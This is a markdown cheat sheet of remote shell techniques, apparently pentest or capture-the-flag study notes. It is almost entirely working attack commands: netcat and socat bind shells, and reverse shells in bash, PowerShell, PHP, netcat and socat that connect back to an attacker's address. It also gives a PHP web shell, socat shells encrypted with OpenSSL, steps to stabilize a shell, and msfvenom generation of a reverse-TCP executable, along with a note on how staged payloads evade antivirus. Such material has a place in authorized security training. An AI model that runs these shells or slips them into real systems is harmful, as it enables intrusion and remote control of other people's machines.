# Remote shell

## Bind shells

### Netcat bind shell

`nc -lvnp 1234 -e "cmd.exe"`

### Socat bind shell

- Linux target:

  `socat TCP-L:1234 EXEC:"bash -li"`

- Windows target:

  `socat TCP-L:1234 EXEC:"powershell.exe,pipes"`

  We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

- Attackbox connect command:

  `socat TCP:<TARGETIP>:1234 -`

## Reverse shells

### Bash reverse shell

The simplest method is to use bash, which is available on almost all Linux machines. This script was tested on Ubuntu 18.04, but not all versions of bash support this function:

`/bin/bash -i >& /dev/tcp/<ATTACKBOXIP>/9999 0>&1`

or

```
exec 5<>/dev/tcp/<ATTACKBOXIP>/9999
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Windows powershell

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### PHP reverse shell

If the target machine is a web server that supports PHP, this language will be an excellent choice for a reverse shell:

`php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'`

If this does not work, you can try replacing &3 with consecutive file descriptors.

### PHP web shell

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

### Netcat reverse shell

#### Setup listener:

`nc -lvnp 1234`

#### Option 1 with -e:

`nc <ATTACKBOXIP> 1234 -e /bin/bash`

#### Option 2 without -e:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKBOXIP> 1234 >/tmp/f`

### Socat reverse shell

#### Setup basic listener:

`socat TCP-L:1234 -`

#### Setup fully stable listener:

`socat TCP-L:1234 FILE:``tty``, raw,echo=0`

#### Windows target (for basic listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:powershell.exe,pipes`

#### Linux target (for basic listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:"bash -li"`

#### Linux target (for fully stable listener):

`socat TCP:<ATTACKBOXIP>:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Socat encrypted shells

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:

`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
We then need to merge the two created files into a single .pem file:

`cat shell.key shell.crt > shell.pem`

Now, when we set up our reverse shell listener, we use:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

The same technique would apply for a bind shell:

Target:

`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

Attacker:

`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

### Stablize remote shell

#### Use Python

To "stabilize your shell" for easier ability in typing commands, you can use the usual Python upgrade trick (assuming you are running in a bash shell):

- (on the reverse shell) `python3 -c "import pty; pty.spawn('/bin/bash')"`
- (on the reverse shell) `export TERM=xterm`
- (press `Ctrl+Z` on your keyboard)
- (on your local host) `stty raw -echo; fg`
- (press `Enter` on your keyboard)

You now have a stable shell, where you can safely use the left-and-right arrow keys to move around your input, up-and-down arrow keys to revisit command history, Tab for autocomplete and safely Ctrl+C to stop running programs!

#### Use rlwrap

1. Setup listener:
   This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise.
   
   `rlwrap nc -lvnp 1234`

2. Stabilize by using the same trick as in step three of the previous technique:

- (press `Ctrl+Z` on your keyboard)
- (on your local host) `stty raw -echo; fg`
- (press `Enter` on your keyboard)

## Shell payloads

### msfvenom

The standard syntax for msfvenom:

`msfvenom -p <PAYLOAD> <OPTIONS>`

#### Windows .exe

`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<ATTACKBOXIP> LPORT=1234`

### Staged vs stageless

- Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler.
- Stageless payloads entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

